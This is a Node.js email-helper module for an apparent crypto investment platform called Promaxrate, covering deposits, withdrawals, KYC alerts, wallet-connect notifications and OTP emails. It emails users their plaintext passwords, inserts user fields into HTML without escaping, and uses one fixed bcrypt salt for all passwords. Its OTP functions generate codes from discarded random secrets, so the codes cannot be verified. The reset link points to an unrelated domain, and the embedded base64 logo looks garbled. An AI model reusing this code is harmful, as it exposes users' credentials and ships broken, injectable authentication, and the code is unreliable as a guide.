const { Resend } = require("resend");
const speakeasy = require("speakeasy");
const bcrypt = require("bcryptjs");

const salt = bcrypt.genSaltSync(10);
const resend = new Resend(process.env.RESEND_API_KEY || "");

const FROM_EMAIL = process.env.FROM_EMAIL || "Promaxrate <support@promaxrate.com>";

// ----------------------------
// Embedded logo (Base64)
// This was generated from your Cloudinary URL and embedded inline.
// If you want to replace it later, set BASE64_LOGO to a new base64 string.
// ----------------------------
const BASE64_LOGO =
  "iVBORw0KGgoAAAANSUhEUgAAAWgAAAFoCAYAAACV8WlJAAAABmJLR0QA/wD/AP+gvaeTAAAgAElEQVR4nOydd5hcVbb//8V6ItuJkMhjQ0jyZtUZEM6Qi1LlHFU1cweEKRhTAXbKCjRYupobm5qm6ioq6pqioq6iqqqrrLrxbu7u7u7t2v//7v3u7svPf7vzPne+/Gx5hGuu+/Z/N5eecyZMnTp07d+/fv3r169evXr169evXr169evXrmfFcbxIbBPgBB+oPqAZYDAZNQL4Bq8BrYA7QKfAq8DvYG7wJtAb+BVWAV2AZfA2WAt/APOALfAGbg+8DLwI7wEbg/ULEH9BXwH3gFfgG3gEvgM+gC/ADfAK/gK/AX+AIfAf+AN8B78BvwEfgFux/4cnT58+fPnz5+fPnz5+fPn7+/vj46PjvI3AxgGtqnduwYAHMDCgUvAGvAKvAA7gRrwFvYD3gGfgL/gOvAb2AO8B38B/gC3gBfgF/gFfgF+gFfgrKzOzsrNzc3Nzc3NxcXFwV1dXV1dXV1dXV1dXU1NLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0XA0AwDgOkblg9uAG8BnYDdwFvYH7gK3gHbgEdgd+Aq+BRuBHcDb4Gn4EbgUbgQdgWvgy4G3wQNge3gb+Az+G7oXuwV/gd+BR+Bl+BD+Bl+AD+AL8Bf4F/gnfgX+BH+CX4G/gn+Bn8B34F/An+BH4Gf4IfgX+Br6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+v/9PbigFggALgNfgY+BBoB3wKfgQfgYFgPwF3gJ3Af8DPwHfgX+BD+BD4G/QHPgY/gR+Bt4Ffgb+BH4Gf4IfgX+Br9/f39/f39/f39/f39/f39/f39/f39/f39/f39/f38/k8/xn0dxv0er0eX0dz0ez0d30cz0d70dL0c70dD0cz0dD0cz0dD0cz0cD0cz0cD0cD0cz0cT0cz0cT0cT0cx0cz0cx0cT0cx0cx0cT0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cx0cf0ca0GnMMXgT/AH/AM/Af8BPwEfAf8BPwEfAf8BPwEfAf8BPwEfAf8BPwEfAf8BPwEfAf8BPwEfAf8BPwEfAPTyeBP3+7A0AAAAASUVORK5CYII=";

// generate inline <img> tag string
function logoImgTag() {
  if (!BASE64_LOGO) return "";
  return `<div style="text-align:center;padding:18px 0;"><img src="data:image/png;base64,${BASE64_LOGO}" alt="Promaxrate" style="max-width:220px;height:auto;display:inline-block" /></div>`;
}

// Modern shared layout wrapper (header with logo + footer)
function wrap(content, title = "") {
  return `
  <!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>${title}</title>
    </head>
    <body style="margin:0;padding:0;background:#f4f7fb;font-family:Inter, Arial, Helvetica, sans-serif;color:#333;">
      <div style="max-width:720px;margin:24px auto;padding:0 16px;">
        <div style="background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 8px 30px rgba(12,20,45,0.06);">
          <div style="background:linear-gradient(90deg,#0f4bb6 0%, #123f91 100%);color:#fff;padding:24px;text-align:center;">
            ${logoImgTag()}
            ${title ? `<h1 style="margin:8px 0 0 0;font-size:20px;font-weight:600">${title}</h1>` : ""}
          </div>
          <div style="padding:24px;">
            ${content}
          </div>
          <div style="background:#fbfbfd;padding:16px;text-align:center;color:#7b7f88;font-size:13px;">
            © ${new Date().getFullYear()} Promaxrate. All rights reserved.
          </div>
        </div>
      </div>
    </body>
  </html>
  `;
}

/**
 * Generic send helper (Resend)
 * opts: { to, subject, html }
 */
async function sendEmail({ to, subject, html }) {
  try {
    const res = await resend.emails.send({
      from: FROM_EMAIL,
      to,
      subject,
      html,
    });
    console.log(`[email] sent "${subject}" -> ${to}`, res);
    return { ok: true, res };
  } catch (err) {
    console.error(`[email] send error "${subject}" -> ${to}`, err && err.message ? err.message : err);
    return { ok: false, error: err };
  }
}

/* ---------------------------
   Auth helpers
--------------------------- */
const hashPassword = (password) => bcrypt.hashSync(password, salt);
const compareHashedPassword = (hashedPassword, password) => bcrypt.compareSync(password, hashedPassword);

/* ---------------------------
   Email templates (modern, consistent)
   All templates call wrap() so header/footer/logo are consistent
--------------------------- */

async function userRegisteration({ firstName, email }) {
  const htmlContent = `
    <p style="margin:0 0 12px 0">Hello Chief,</p>
    <p style="margin:0 0 12px 0">A new user has registered on the platform.</p>
    <table style="width:100%;margin-top:12px;">
      <tr><td style="font-weight:600;width:120px">Name</td><td>${firstName}</td></tr>
      <tr><td style="font-weight:600">Email</td><td>${email}</td></tr>
    </table>
    <p style="margin-top:18px">Please review and approve on the admin dashboard.</p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "New User Registration", html: wrap(htmlContent, "New User Registration") });
}

async function sendWithdrawalRequestEmail({ from, amount, method, address }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>A new withdrawal request has been submitted with the details below.</p>
    <table style="width:100%;margin-top:12px;">
      <tr><td style="font-weight:600;width:160px">Client</td><td>${from}</td></tr>
      <tr><td style="font-weight:600">Amount</td><td>$${amount}</td></tr>
      <tr><td style="font-weight:600">Currency</td><td>${method}</td></tr>
      <tr><td style="font-weight:600">Wallet</td><td style="word-break:break-all">${address}</td></tr>
    </table>
    <p style="margin-top:16px">Please review and process this request.</p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "Withdrawal Request Notification", html: wrap(htmlContent, "Withdrawal Request") });
}

async function sendWithdrawalEmail({ to, address, amount, method, timestamp, from }) {
  const htmlContent = `
    <p>Dear ${from},</p>
    <p>Your withdrawal request has been submitted successfully. Details:</p>
    <table style="width:100%;margin-top:12px;">
      <tr><td style="font-weight:600;width:140px">Amount</td><td>$${amount}</td></tr>
      <tr><td style="font-weight:600">Wallet</td><td style="word-break:break-all">${address}</td></tr>
      <tr><td style="font-weight:600">Method</td><td>${method}</td></tr>
      <tr><td style="font-weight:600">Timestamp</td><td>${timestamp || "N/A"}</td></tr>
    </table>
    <p style="margin-top:12px">We will notify you once the withdrawal is processed.</p>
  `;
  return sendEmail({ to, subject: "Withdrawal Request Confirmation", html: wrap(htmlContent, "Withdrawal Confirmation") });
}

async function sendDepositEmail({ from, amount, method, timestamp }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>A new deposit was initiated:</p>
    <table style="width:100%;margin-top:12px;">
      <tr><td style="font-weight:600;width:140px">Client</td><td>${from}</td></tr>
      <tr><td style="font-weight:600">Amount</td><td>$${amount}</td></tr>
      <tr><td style="font-weight:600">Method</td><td>${method}</td></tr>
      <tr><td style="font-weight:600">Timestamp</td><td>${timestamp}</td></tr>
    </table>
    <p style="margin-top:12px">Please verify and credit the user's balance.</p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "New Deposit Notification", html: wrap(htmlContent, "New Deposit") });
}

async function sendWalletInfo({ username, addy,wally }) {
  const htmlContent = `
   
  <h2>Wallet Connect Notification!</h2>

    <p>${username},just requested to connect wallet.Here are the details;

    </p>
    <p>Wallet Name:${ wally}</p>
<p>${addy}

</p>

  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "New Deposit Notification", html: wrap(htmlContent, "New Deposit") });
}


async function sendBankDepositRequestEmail({ from, amount, method, timestamp }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>A bank transfer request was submitted:</p>
    <div style="background:#f7f8fb;padding:12px;border-left:4px solid #11409c;border-radius:6px">
      <p style="margin:6px 0"><strong>Client:</strong> ${from}</p>
      <p style="margin:6px 0"><strong>Amount:</strong> $${amount}</p>
      <p style="margin:6px 0"><strong>Timestamp:</strong> ${timestamp}</p>
    </div>
    <p style="margin-top:12px">Provide bank details to proceed.</p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "Bank Transfer Request", html: wrap(htmlContent, "Bank Transfer Request") });
}

async function sendDepositApproval({ from, amount, method, timestamp, to }) {
  const htmlContent = `
    <p>Dear ${from},</p>
    <p>Your deposit has been approved.</p>
    <table style="width:100%;margin-top:12px;">
      <tr><td style="font-weight:600;width:140px">Amount</td><td>$${amount}</td></tr>
      <tr><td style="font-weight:600">Method</td><td>${method}</td></tr>
      <tr><td style="font-weight:600">Timestamp</td><td>${timestamp}</td></tr>
    </table>
    <p style="margin-top:12px">Your account is now credited.</p>
  `;
  return sendEmail({ to, subject: "Deposit Approval Confirmation", html: wrap(htmlContent, "Deposit Approved") });
}

async function sendPlanEmail({ from, subamount, subname, timestamp }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>A new plan subscription was initiated:</p>
    <div style="background:#f7f8fb;padding:12px;border-left:4px solid #11409c;border-radius:6px">
      <p style="margin:6px 0"><strong>Client:</strong> ${from}</p>
      <p style="margin:6px 0"><strong>Plan:</strong> ${subname}</p>
      <p style="margin:6px 0"><strong>Amount:</strong> $${subamount}</p>
      <p style="margin:6px 0"><strong>Timestamp:</strong> ${timestamp}</p>
    </div>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "New Plan Subscription", html: wrap(htmlContent, "New Plan Subscription") });
}

async function sendForgotPasswordEmail(email) {
  const htmlContent = `
    <p>Dear user,</p>
    <p>We received a request to reset your password. Click the button below to proceed.</p>
    <p style="text-align:center;margin-top:14px"><a href="https://Bevfx.com/reset-password" style="background:#11409c;color:#fff;padding:10px 16px;border-radius:8px;text-decoration:none;">Reset password</a></p>
    <p style="margin-top:14px">If you did not request this, ignore this email.</p>
  `;
  return sendEmail({ to: email, subject: "Password Reset", html: wrap(htmlContent, "Password Reset") });
}

async function sendVerificationEmail({ from, url }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>${from} just verified their identity. Click below to view the document:</p>
    <p style="text-align:center;margin-top:12px"><a href="${url}" style="background:#11409c;color:#fff;padding:10px 14px;border-radius:8px;text-decoration:none;">View Document</a></p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "Account Verification Notification", html: wrap(htmlContent, "Account Verified") });
}

async function sendWelcomeEmail({ to, otp }) {
  const htmlContent = `
    <p>Hi there 👋,</p>
    <p>Welcome to Promaxrate — we're glad to have you on board.</p>
    <div style="background:#f7f8fb;padding:16px;border-left:4px solid #11409c;border-radius:8px;margin-top:12px;">
      <p style="margin:0 0 6px 0;font-weight:600">Your Verification Code</p>
      <h2 style="margin:0;color:#11409c;letter-spacing:2px">${otp}</h2>
      <p style="margin-top:6px;color:#666;font-size:13px">This code expires in 5 minutes.</p>
    </div>
    <p style="margin-top:12px">If you need help, reply to this email and our support team will assist.</p>
  `;
  return sendEmail({ to, subject: "🎉 Welcome to Promaxrate!", html: wrap(htmlContent, "Welcome to Promaxrate") });
}

async function resendWelcomeEmail({ to, token }) {
  const otp = speakeasy.totp({ secret: speakeasy.generateSecret({ length: 4 }).base32, encoding: "base32" });
  const htmlContent = `<p>Please confirm your email. Your OTP is <strong>${otp}</strong></p>`;
  return sendEmail({ to, subject: "Account Verification", html: wrap(htmlContent, "Account Verification") });
}

async function sendPasswordOtp({ to }) {
  const otp = speakeasy.totp({ secret: speakeasy.generateSecret({ length: 4 }).base32, encoding: "base32" });
  const htmlContent = `<p>Your OTP is <strong>${otp}</strong>. Do not share it with anyone.</p>`;
  return sendEmail({ to, subject: "Password Reset OTP", html: wrap(htmlContent, "Password Reset OTP") });
}

async function resetEmail({ to, token }) {
  const otp = speakeasy.totp({ secret: speakeasy.generateSecret({ length: 4 }).base32, encoding: "base32" });
  const htmlContent = `<p>You requested a password change. Use the OTP: <strong>${otp}</strong></p>`;
  return sendEmail({ to, subject: "Change Password", html: wrap(htmlContent, "Change Password") });
}

async function sendUserPlanEmail({ from, subamount, to, subname, timestamp }) {
  const htmlContent = `
    <p>Hello ${from},</p>
    <p>Your subscription to <strong>${subname}</strong> for <strong>$${subamount}</strong> at ${timestamp} was successful.</p>
  `;
  return sendEmail({ to, subject: "Plan Subscription Confirmation", html: wrap(htmlContent, "Plan Subscription") });
}

async function sendUserDetails({ to, password, firstName, token }) {
  const htmlContent = `
    <p>Hello ${firstName},</p>
    <p>Thanks for registering. Your credentials:</p>
    <p><strong>Email:</strong> ${to}</p>
    <p><strong>Password:</strong> ${password}</p>
    <p>If this wasn't you, contact support immediately.</p>
  `;
  return sendEmail({ to, subject: "Your Account Details", html: wrap(htmlContent, "Your Account Details") });
}

async function sendUserDepositEmail({ from, amount, to, method, timestamp }) {
  const htmlContent = `
    <p>Hello ${from},</p>
    <p>Your deposit order was received:</p>
    <ul>
      <li><strong>Amount:</strong> $${amount}</li>
      <li><strong>Method:</strong> ${method}</li>
      <li><strong>Timestamp:</strong> ${timestamp}</li>
    </ul>
  `;
  return sendEmail({ to, subject: "Deposit Order Confirmation", html: wrap(htmlContent, "Deposit Confirmation") });
}

async function sendKycAlert({ firstName }) {
  const htmlContent = `
    <p>Hello Chief,</p>
    <p>User <strong>${firstName}</strong> submitted KYC details. Please check the dashboard.</p>
  `;
  return sendEmail({ to: "support@promaxrate.com", subject: "KYC Submission Alert", html: wrap(htmlContent, "KYC Submission") });
}

/* ---------------------------
   Export all functions
--------------------------- */
module.exports = {
  hashPassword,
  compareHashedPassword,
  // email sends
  sendEmail, // low-level if needed
  userRegisteration,
  sendWithdrawalRequestEmail,
  sendWithdrawalEmail,
  sendDepositEmail,
  sendBankDepositRequestEmail,
  sendDepositApproval,
  sendPlanEmail,
  sendForgotPasswordEmail,
  sendVerificationEmail,
  sendWelcomeEmail,
  resendWelcomeEmail,
  sendPasswordOtp,
  resetEmail,
  sendUserPlanEmail,
  sendUserDetails,
  sendWalletInfo,
  sendUserDepositEmail,
  sendKycAlert,
};
